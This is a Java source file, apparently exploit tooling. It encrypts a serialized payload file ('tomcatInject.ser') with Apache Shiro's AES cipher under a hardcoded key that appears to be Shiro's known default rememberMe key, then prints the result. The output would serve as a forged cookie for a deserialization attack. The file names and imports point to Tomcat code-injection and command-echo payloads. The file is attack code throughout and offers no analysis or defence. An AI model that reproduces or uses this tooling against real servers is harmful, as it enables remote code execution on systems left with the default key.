import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.catalina.startup.Tomcat;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.io.*;

import org.apache.coyote.http11.Http11Processor;

public class AESEncode {

    public static void main(String[] args) throws Exception {

        String tomcatHeader = "./tomcatHeader.ser";
        String tomcatInject = "./tomcatInject.ser";
        String tomcatEcho = "./TomcatEcho.ser";


        byte[] key = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
        AesCipherService aes = new AesCipherService();
        ByteSource ciphertext = aes.encrypt(getBytes(tomcatInject), key);
        System.out.printf(ciphertext.toString());
    }


    public static byte[] getBytes(String path) throws Exception{
        InputStream inputStream = new FileInputStream(path);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;

    }
}